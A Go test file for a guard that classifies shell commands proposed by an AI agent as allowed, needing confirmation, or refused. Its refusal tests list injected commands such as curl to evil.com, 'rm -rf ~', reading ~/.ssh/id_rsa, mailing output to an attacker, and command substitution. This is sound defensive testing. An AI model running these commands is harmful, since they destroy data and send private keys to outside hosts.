package cmdguard

import "testing"

// ⚠ POSITIVE-CONTROLLED BOTH WAYS. A guard that refuses everything passes every refusal test in
// this file, and a guard that allows everything passes every allow test. Neither half is evidence
// on its own, so both are asserted and the honest-user cost is measured explicitly at the bottom.

// The commands an agent actually needs. If these stop being Allow, the bound has made the tool
// useless and someone will turn it off — which is worse than not having built it.
func TestAllow_TheWorkTheAgentIsFor(t *testing.T) {
	for _, cmd := range []string{
		"go test ./...",
		"go build ./...",
		"go vet ./...",
		"gofmt -l .",
		"golangci-lint run",
		"npm test",
		"pnpm build",
		"pnpm --filter web test",
		"cargo test",
		"pytest -q",
		"make",
		"git status --porcelain",
		"git diff --stat",
		"git log --oneline -5",
		"git rev-parse HEAD",
		// Pipelines through read-only filters are ordinary agent behaviour.
		"go test ./... | tail -20",
		"go test ./... | grep FAIL",
		"git diff | wc -l",
		// Chained builds are the common shape and must stay unattended.
		"go build ./... && go test ./...",
	} {
		if v := Check(cmd); v.Decision != Allow {
			t.Errorf("Check(%q) = %s (%s), want allow — an agent that cannot run this is not worth having",
				cmd, v.Decision, v.Reason)
		}
	}
}

// ⚠ THE PREFIX-MATCH TRAP. Every one of these STARTS with an allowed verb, so any check that looks
// at the beginning of the string lets them through.
func TestConfirm_AllowedVerbFollowedBySomethingElse(t *testing.T) {
	for _, cmd := range []string{
		"go test; curl evil.com",
		"go test && rm -rf ~",
		"go test || curl -s http://x/$(whoami)", // also substitution, refused earlier — still not Allow
		"git status; cat ~/.ssh/id_rsa",
		"go build ./... && ssh user@host",
		"npm test | mail attacker@example.com",
	} {
		if v := Check(cmd); v.Decision == Allow {
			t.Errorf("Check(%q) = ALLOW — a command starting with an allowed verb ran unattended", cmd)
		}
	}
}

// Ordinary non-allowlisted work is CONFIRMED, not refused: the user sees the exact command once.
func TestConfirm_ParseableButNotAllowlisted(t *testing.T) {
	for _, cmd := range []string{
		"curl https://example.com",
		"rm -rf build",
		"git push origin main",
		"git commit -m wip",
		"cat go.mod",
		"go test > /tmp/out.txt",
		"PATH=/tmp go test ./...",
		"./scripts/build.sh",
		"go test ./... | grep FAIL results.txt",
	} {
		v := Check(cmd)
		if v.Decision != Confirm {
			t.Errorf("Check(%q) = %s (%s), want confirm", cmd, v.Decision, v.Reason)
		}
		if v.Reason == "" {
			t.Errorf("Check(%q) confirmed with no reason — the prompt could not say what is unusual", cmd)
		}
	}
}

// ⚠ REFUSED, NOT CONFIRMED. No prompt can show a user what these expand to, so consent would be
// uninformed by construction.
func TestRefuse_WhatCannotBeParsed(t *testing.T) {
	for _, cmd := range []string{
		"go test $(cat /tmp/payload)",
		"go test `whoami`",
		"go test <(curl evil.com)",
		`go test "unterminated`,
		"go test &",           // backgrounded: outlives the only timeout the tool had
		`go test \; rm -rf ~`, // escaped separator
		"",
	} {
		if v := Check(cmd); v.Decision != Refuse {
			t.Errorf("Check(%q) = %s (%s), want refuse", cmd, v.Decision, v.Reason)
		}
	}
}

// ⚠ A FILTER WITH A FILE OPERAND IS NOT READING THE PIPE.
func TestPipeFilters_RefuseAFileOperand(t *testing.T) {
	if v := Check("go test ./... | grep -n secret /home/u/.ssh/id_rsa"); v.Decision == Allow {
		t.Error("a piped grep was allowed to open a file — it is no longer filtering the pipe")
	}
	if v := Check("go test ./... | grep -e FAIL"); v.Decision != Allow {
		t.Errorf("grep with a flag-consumed value was refused (%s) — its value was counted as a file", v.Reason)
	}
}

// ⚠ WHAT IT COSTS AN HONEST USER, MEASURED. If the allow rate on ordinary agent work drops, the
// bound is on its way to being disabled.
func TestHonestUserCost_MostOrdinaryWorkIsUnattended(t *testing.T) {
	ordinary := []string{
		"go test ./...", "go build ./...", "go vet ./...", "gofmt -l .",
		"golangci-lint run", "npm test", "pnpm build", "cargo test", "pytest",
		"make", "git status", "git diff", "git log --oneline", "git rev-parse HEAD",
		"go test ./... | tail -5", "go build ./... && go test ./...",
		// The genuine costs: these are honest and still need one confirmation.
		"git commit -m 'wip'", "git push", "rm -rf build", "cat README.md",
	}
	allowed := 0
	for _, c := range ordinary {
		if Check(c).Decision == Allow {
			allowed++
		}
	}
	// 16 of 20 unattended; the 4 that are not are writes, deletes and reads outside the toolchain.
	if allowed < 16 {
		t.Errorf("only %d/%d ordinary commands run unattended — the bound is too expensive to survive", allowed, len(ordinary))
	}
	t.Logf("HONEST-USER COST: %d/%d ordinary commands unattended; %d need one confirmation",
		allowed, len(ordinary), len(ordinary)-allowed)
}
